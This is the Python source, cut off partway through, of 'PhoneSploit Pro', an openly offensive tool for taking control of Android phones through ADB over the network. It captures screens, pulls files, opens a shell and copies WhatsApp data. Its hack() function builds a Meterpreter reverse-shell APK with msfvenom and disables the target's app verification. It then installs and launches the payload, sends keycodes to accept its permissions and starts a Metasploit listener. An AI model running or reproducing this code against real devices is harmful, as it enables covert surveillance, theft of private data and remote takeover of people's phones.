#!/usr/bin/env python3 
import os
import random
import socket
import time
import subprocess
import platform
import datetime
import modules


def start():
    # Creating Downloaded-Files folder if it does not exist
    try:
        # Creates a folder to store pulled files
        os.mkdir("Downloaded-Files")
    except:
        pass

    # Checking OS
    global operating_system, opener
    operating_system = platform.system()
    if operating_system == 'Windows':
        # Windows specific configuration
        windows_config()
    else:
        # macOS only
        if operating_system == 'Darwin':
            opener = 'open'

        # On Linux and macOS both
        import readline  # Arrow Key
        check_packages()  # Checking for required packages


def windows_config():
    global clear, opener  # , move
    clear = 'cls'
    opener = 'start'
    # move = 'move'


def check_packages():
    adb_status = subprocess.call(['which', 'adb'])
    scrcpy_status = subprocess.call(['which', 'scrcpy'])
    metasploit_status = subprocess.call(['which', 'msfconsole'])
    nmap_status = subprocess.call(['which', 'nmap'])

    if adb_status != 0 or metasploit_status != 0 or scrcpy_status != 0 or nmap_status != 0:
        print(
            f'\n{color.RED}ERROR : The following required software are NOT installed!\n')

        count = 0  # Count variable for indexing

        if adb_status != 0:
            count = count + 1
            print(f'{color.YELLOW}{count}. {color.YELLOW}ADB{color.WHITE}')

        if metasploit_status != 0:
            count = count + 1
            print(f'{color.YELLOW}{count}. Metasploit-Framework{color.WHITE}')

        if scrcpy_status != 0:
            count = count + 1
            print(f'{color.YELLOW}{count}. Scrcpy{color.WHITE}')

        if nmap_status != 0:
            count = count + 1
            print(f'{color.YELLOW}{count}. Nmap{color.WHITE}')

        print(
            f'\n{color.CYAN}Please install the above listed software.{color.WHITE}\n')

        choice = input(
            f'\n{color.GREEN}Do you still want to continue to PhoneSploit Pro?{color.WHITE}     Y / N > ').lower()
        if choice == 'y' or choice == '':
            return
        elif choice == 'n':
            exit_phonesploit_pro()
            return
        else:
            while choice != 'y' and choice != 'n' and choice != '':
                choice = input(
                    '\nInvalid choice!, Press Y or N > ').lower()
                if choice == 'y' or choice == '':
                    return
                elif choice == 'n':
                    exit_phonesploit_pro()
                    return


def display_menu():
    """ Displays banner and menu"""
    print(selected_banner, page)


def clear_screen():
    """ Clears the screen and display menu """
    os.system(clear)
    display_menu()


def change_page(name):
    global page, page_number
    if name == 'p':
        if page_number > 0:
            page_number = page_number - 1
    elif name == 'n':
        if page_number < 2:
            page_number = page_number + 1
    page = banner.menu[page_number]
    clear_screen()


def connect():
    # Connect only 1 device at a time
    print(f"\n{color.CYAN}Enter target phone's IP Address       {color.YELLOW}Example : 192.168.1.23{color.WHITE}")
    ip = input("> ")
    if ip == '':
        print(
            f'\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}')
        return
    else:
        # Restart ADB on new connection.
        if ip.count('.') == 3:
            os.system(
                'adb kill-server > docs/hidden.txt 2>&1&&adb start-server > docs/hidden.txt 2>&1')
            os.system("adb connect " + ip + ":5555")
        else:
            print(
                f'\n{color.RED} Invalid IP Address\n{color.GREEN} Going back to Main Menu{color.WHITE}')


def list_devices():
    print("\n")
    os.system("adb devices -l")
    print("\n")


def disconnect():
    print("\n")
    os.system("adb disconnect")
    print("\n")


def exit_phonesploit_pro():
    global run_phonesploit_pro
    run_phonesploit_pro = False
    print("\nExiting...\n")


def get_shell():
    print("\n")
    os.system("adb shell")


def get_screenshot():
    global screenshot_location
    # Getting a temporary file name to store time specific results
    file_name = f'screenshot-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.png'
    os.system(f"adb shell screencap -p /sdcard/{file_name}")
    if screenshot_location == '':
        print(
            f"\n{color.YELLOW}Enter location to save all screenshots, Press 'Enter' for default{color.WHITE}")
        screenshot_location = input("> ")
    if screenshot_location == "":
        screenshot_location = 'Downloaded-Files'
        print(
            f"\n{color.PURPLE}Saving screenshot to PhoneSploit-Pro/{screenshot_location}\n{color.WHITE}")
    else:
        print(
            f"\n{color.PURPLE}Saving screenshot to {screenshot_location}\n{color.WHITE}")

    os.system(f"adb pull /sdcard/{file_name} {screenshot_location}")

    # Asking to open file
    choice = input(
        f'\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> ').lower()
    if choice == 'y' or choice == '':
        os.system(f"{opener} {screenshot_location}/{file_name}")

    elif not choice == 'n':
        while choice != 'y' and choice != 'n' and choice != '':
            choice = input(
                '\nInvalid choice!, Press Y or N > ').lower()
            if choice == 'y' or choice == '':
                os.system(f"{opener} {screenshot_location}/{file_name}")

    print("\n")


def screenrecord():
    global screenrecord_location
    # Getting a temporary file name to store time specific results
    file_name = f'vid-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.mp4'

    duration = input(
        f"\n{color.CYAN}Enter the recording duration (in seconds) > {color.WHITE}")
    print(f'\n{color.YELLOW}Starting Screen Recording...\n{color.WHITE}')
    os.system(
        f"adb shell screenrecord --verbose --time-limit {duration} /sdcard/{file_name}")

    if screenrecord_location == '':
        print(
            f"\n{color.YELLOW}Enter location to save all videos, Press 'Enter' for default{color.WHITE}")
        screenrecord_location = input("> ")
    if screenrecord_location == "":
        screenrecord_location = 'Downloaded-Files'
        print(
            f"\n{color.PURPLE}Saving video to PhoneSploit-Pro/{screenrecord_location}\n{color.WHITE}")
    else:
        print(
            f"\n{color.PURPLE}Saving video to {screenrecord_location}\n{color.WHITE}")

    os.system(f"adb pull /sdcard/{file_name} {screenrecord_location}")

    # Asking to open file
    choice = input(
        f'\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> ').lower()
    if choice == 'y' or choice == '':
        os.system(f"{opener} {screenrecord_location}/{file_name}")

    elif not choice == 'n':
        while choice != 'y' and choice != 'n' and choice != '':
            choice = input(
                '\nInvalid choice!, Press Y or N > ').lower()
            if choice == 'y' or choice == '':
                os.system(f"{opener} {screenrecord_location}/{file_name}")
    print("\n")


def pull_file():
    global pull_location
    print(f"\n{color.CYAN}Enter file path           {color.YELLOW}Example : /sdcard/Download/sample.jpg{color.WHITE}")
    location = input("\n> /sdcard/")
# Checking if specified file or folder exists in Android
    if os.system(f'adb shell test -e /sdcard/{location}') == 0:
        pass
    else:
        print(
            f"{color.RED}\n[Error]{color.GREEN} Specified location does not exist {color.GREEN}")
        return

    if pull_location == '':
        print(
            f"\n{color.YELLOW}Enter location to save all files, Press 'Enter' for default{color.WHITE}")
        pull_location = input("> ")
    if pull_location == "":
        pull_location = 'Downloaded-Files'
        print(
            f"\n{color.PURPLE}Saving file to PhoneSploit-Pro/{pull_location}\n{color.WHITE}")
    else:
        print(f"\n{color.PURPLE}Saving file to {pull_location}\n{color.WHITE}")
    os.system(f'adb pull /sdcard/{location} {pull_location}')

    # Asking to open file
    choice = input(
        f'\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> ').lower()

    # updating location = file_name if it existed inside a folder
    # Example : sdcard/DCIM/longtime.jpg -> longtime.jpg
    file_path = location.split('/')
    location = file_path[len(file_path) - 1]

    # processing request
    if choice == 'y' or choice == '':
        os.system(f"{opener} {pull_location}/{location}")

    elif not choice == 'n':
        while choice != 'y' and choice != 'n' and choice != '':
            choice = input(
                '\nInvalid choice!, Press Y or N > ').lower()
            if choice == 'y' or choice == '':
                os.system(f"{opener} {pull_location}/{location}")


def push_file():
    location = input(
        f"\n{color.CYAN}Enter file path in computer{color.WHITE} > ")

    if location == '':
        print(
            f'\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}')
        return
    else:
        if operating_system == 'Windows':
            file_status = int(os.popen(
                f'if exist {location} (echo 0) ELSE (echo 1)').read())
        else:
            file_status = os.system(f'test -e {location}')
        if file_status == 0:
            pass
        else:
            print(
                f"{color.RED}\n[Error]{color.GREEN} Specified location does not exist {color.GREEN}")
            return
        destination = input(
            f"\n{color.CYAN}Enter destination path              {color.YELLOW}Example : /sdcard/Documents{color.WHITE}\n> /sdcard/")
        os.system("adb push " + location + " /sdcard/" + destination)


def stop_adb():
    os.system("adb kill-server")
    print("\nStopped ADB Server")


def install_app():
    file_location = input(
        f"\n{color.CYAN}Enter APK path in computer{color.WHITE} > ")

    if file_location == '':
        print(
            f'\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}')
        return
    else:
        if file_location[len(file_location)-1] == ' ':
            file_location = file_location.removesuffix(' ')
        file_location = file_location.replace("'", "")
        file_location = file_location.replace('"', '')
        if not os.path.isfile(file_location):
            print(
                f"{color.RED}\n[Error]{color.GREEN} This file does not exist {color.GREEN}")
            return
        else:
            file_location = "'" + file_location + "'"
            os.system("adb install " + file_location)
        print("\n")


def uninstall_app():
    print(f'''
    {color.WHITE}1.{color.GREEN} Select from App List
    {color.WHITE}2.{color.GREEN} Enter Package Name Manually
    {color.WHITE}''')

    mode = (input("> "))
    if mode == '1':

        # Listing third party apps
        list = os.popen("adb shell pm list packages -3").read().split("\n")
        list.remove('')
        i = 0
        print("\n")
        for app in list:
            i += 1
            app = app.replace("package:", "")
            print(f"{color.GREEN}{i:02d}.{color.WHITE} {app}")

        # Selection of app
        app = input("\nEnter Selection > ")
        if (app.isdigit()):
            if int(app) <= len(list) and int(app) > 0:
                package = list[int(app)-1].replace("package:", "")
                print(
                    f"\n{color.RED}Uninstalling {color.YELLOW}{package}{color.WHITE}")
                os.system("adb uninstall " + package)
            else:
                print(
                    f'\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}')
                return
        else:
            print(
                f'\n{color.RED} Expected an Integer Value\n{color.GREEN} Going back to Main Menu{color.WHITE}')
            return

    elif mode == '2':

        print(
            f"\n{color.CYAN}Enter package name     {color.WHITE}Example : com.spotify.music ")
        package_name = input("> ")

        if package_name == '':
            print(
                f'\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}')
        else:
            os.system("adb uninstall " + package_name)
    else:
        print(
            f'\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}')
        return

    print("\n")


def launch_app():
    print(
        f"\n{color.CYAN}Enter package name.     {color.WHITE}Example : com.spotify.music ")
    package_name = input("> ")

    if package_name == '':
        print(
            f'\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}')
        return
    else:
        os.system("adb shell monkey -p " + package_name + " 1")
        print("\n")


def list_apps():
    print(f'''

    {color.WHITE}1.{color.GREEN} List third party packages {color.WHITE}
    {color.WHITE}2.{color.GREEN} List all packages {color.WHITE}
    ''')
    mode = (input("> "))

    if mode == '1':
        os.system("adb shell pm list packages -3")
    elif mode == '2':
        os.system("adb shell pm list packages")
    else:
        print(
            f'\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}')
    print("\n")


def reboot(key):
    print(
        f'\n{color.RED}[Warning]{color.YELLOW} Restarting will disconnect the device{color.WHITE}')
    choice = input('\nDo you want to continue?     Y / N > ').lower()
    if choice == 'y' or choice == '':
        pass
    elif choice == 'n':
        return
    else:
        while choice != 'y' and choice != 'n' and choice != '':
            choice = input('\nInvalid choice!, Press Y or N > ').lower()
            if choice == 'y' or choice == '':
                pass
            elif choice == 'n':
                return

    if key == 'system':
        os.system('adb reboot')
    else:
        print(f'''
    {color.WHITE}1.{color.GREEN} Reboot to Recovery Mode
    {color.WHITE}2.{color.GREEN} Reboot to Bootloader
    {color.WHITE}3.{color.GREEN} Reboot to Fastboot Mode
    {color.WHITE}''')
        mode = (input("> "))
        if mode == '1':
            os.system('adb reboot recovery')
        elif mode == '2':
            os.system('adb reboot bootloader')
        elif mode == '3':
            os.system('adb reboot fastboot')
        else:
            print(
                f'\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}')
            return

    print("\n")


def list_files():
    print('\n')
    os.system('adb shell ls -a /sdcard/')
    print('\n')


def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]


def instructions():
    """Prints instructions for Metasploit and returns user's choice"""
    os.system(clear)
    print(banner.instructions_banner + banner.instruction)
    choice = input('> ')
    if choice == '':
        return True
    else:
        return False


def hack():
    continue_hack = instructions()
    if continue_hack:
        os.system(clear)
        ip = get_ip_address()  # getting IP Address to create payload
        lport = '4444'
        print(
            f"\n{color.CYAN}Using LHOST : {color.WHITE}{ip}{color.CYAN} & LPORT : {color.WHITE}{lport}{color.CYAN} to create payload\n{color.WHITE}")

        choice = input(
            f"\n{color.YELLOW}Press 'Enter' to continue OR enter 'M' to modify LHOST & LPORT > {color.WHITE}").lower()

        if choice == 'm':
            ip = input(f"\n{color.CYAN}Enter LHOST > {color.WHITE}")
            lport = input(f"\n{color.CYAN}Enter LPORT > {color.WHITE}")
        elif choice != '':
            while choice != 'm' and choice != '':
                choice = input(
                    f"\n{color.RED}Invalid selection! , Press 'Enter' OR M > {color.WHITE}").lower()
                if choice == 'm':
                    ip = input(f"\n{color.CYAN}Enter LHOST > {color.WHITE}")
                    lport = input(f"\n{color.CYAN}Enter LPORT > {color.WHITE}")

        print(banner.hacking_banner)
        print(f"\n{color.CYAN}Creating payload APK...\n{color.WHITE}")
        # creating payload
        os.system(
            f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lport} > test.apk")
        print(f"\n{color.CYAN}Installing APK to target device...{color.WHITE}\n")
        os.system('adb shell input keyevent 3')  # Going on Home Screen

        # Disabling App Verification
        os.system('adb shell settings put global package_verifier_enable 0')
        os.system('adb shell settings put global verifier_verify_adb_installs 0')

        # installing apk to device
        if operating_system == 'Windows':
            # (used 'start /b' to execute command in background)
            # os.system("start /b adb install -r test.apk")
            os.system("adb install -r test.apk")
        else:
            # (used ' &' to execute command in background)
            # os.system("adb install -r test.apk &")
            os.system("adb install -r test.apk")
        # time.sleep(5)  # waiting for apk to be installed

        # Discarding these steps
        # print(
        #     f"\n{color.CYAN}Sending keycodes to Bypass Google Play Protect\n{color.WHITE}")
        # os.system('adb shell input keyevent 20')
        # os.system('adb shell input keyevent 20')
        # os.system('adb shell input keyevent 66')

        # Keyboard input to accept app install
        print(f"\n{color.CYAN}Launching app...\n{color.WHITE}")
        package_name = "com.metasploit.stage"  # payload package name
        os.system("adb shell monkey -p " + package_name + " 1")
        time.sleep(3)  # waiting for app to launch

        # Keyboard input to accept app permissions
        print(
            f"\n{color.CYAN}Sending keycodes to accept the app permissions\n{color.WHITE}")
        os.system('adb shell input keyevent 22')
        os.system('adb shell input keyevent 22')
        os.system('adb shell input keyevent 66')

        # Launching Metasploit
        print(
            f"\n{color.RED}Launching and Setting up Metasploit-Framework\n{color.WHITE}")
        os.system(
            f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT {lport} ; exploit'")

        # Re-Enabling App Verification (Restoring Device to Previous State)
        os.system('adb shell settings put global package_verifier_enable 1')
        os.system('adb shell settings put global verifier_verify_adb_installs 1')

    else:
        print('\nGoing Back to Main Menu\n')


def copy_whatsapp():
    global pull_location
    if pull_location == '':
        print(
            f"\n{color.YELLOW}Enter location to save WhatsApp Data, Press 'Enter' for default{color.WHITE}")
        pull_location = input("> ")
    if pull_location == "":
        pull_location = 'Downloaded-Files'
        print(
            f"\n{color.PURPLE}Saving data to PhoneSploit-Pro/{pull_location}\n{color.WHITE}")
    else:
        print(f"\n{color.PURPLE}Saving data to {pull_location}\n{color.WHITE}")

    # folder_status = os.system(
    #     'adb shell test -d "/sdcard/Android/media/com.whatsapp/WhatsApp"')

    # 'test -d' checks if directory exist or not
    # If WhatsApp exists in Androi